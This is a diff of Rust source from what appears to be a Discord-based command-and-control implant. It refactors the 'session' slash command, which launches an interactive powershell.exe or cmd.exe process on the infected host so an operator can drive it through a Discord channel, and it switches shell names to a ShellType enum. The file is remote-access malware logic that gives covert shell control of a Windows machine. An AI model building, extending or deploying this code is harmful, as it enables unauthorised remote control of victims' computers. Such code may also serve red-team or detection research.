@@ -1,16 +1,16 @@
 use crate::commands::sessions::exit;
 use crate::errors::DiscordC2Error;
 use crate::utils::{agent::get_or_create_agent, channels::create_text_channel};
-
-use chrono::Utc;
+use crate::os::process_handler::{ProcessHandler, ShellType};
 
 use serenity::{
     builder::CreateApplicationCommand,
     model::{application::{command::{Command, CommandOptionType}, interaction::application_command::{CommandDataOption, CommandDataOptionValue}}},
     client::Context,
 };
+use chrono::Utc;
 
-use crate::os::process_handler::ProcessHandler;
+
 
 pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
     // Register the session command
@@ -21,7 +21,7 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
             |option| {
                 option.name("session-type")
                     .kind(CommandOptionType::String)
-                    .description("The type of session to open.")
+                    .description("The type of interactive session to open.")
                     .add_string_choice("powershell.exe", "powershell")
                     .add_string_choice("cmd.exe", "cmd")
                     .required(true)
@@ -29,7 +29,7 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
         )
 }
 
-pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String, Option<String>), DiscordC2Error> {
+pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String, Option<ShellType>), DiscordC2Error> {
     let mut agent = get_or_create_agent(ctx).await;
     let now = Utc::now().format("%m-%d-%Y┇%H︰%M︰%S╏UTC").to_string();
 
@@ -50,17 +50,17 @@ pub async fn run(ctx: &Context, options: &[CommandDataOption]) -> Result<(String
         session_channel
     );
 
-    Command::create_global_application_command(&ctx.http, exit::register).await?;
+    Command::create_global_application_command(&ctx.http, exit::register).await?; // Create the /exit command
 
     if let CommandDataOptionValue::String(shell_type) = option {
         let (content, shell) = match shell_type.as_str() {
             "powershell" => {
-                ProcessHandler::instance("powershell.exe").await?;
-                (string, shell_type.clone())
+                ProcessHandler::instance(ShellType::Powershell).await?;
+                (string, ShellType::Powershell)
             },
             "cmd" => {
-                ProcessHandler::instance("cmd.exe").await?;
-                (string, shell_type.clone())
+                ProcessHandler::instance(ShellType::Cmd).await?;
+                (string, ShellType::Cmd)
             },
             _ => return Ok((format!("Unsupported shell type: {}", shell_type), None)),
         };
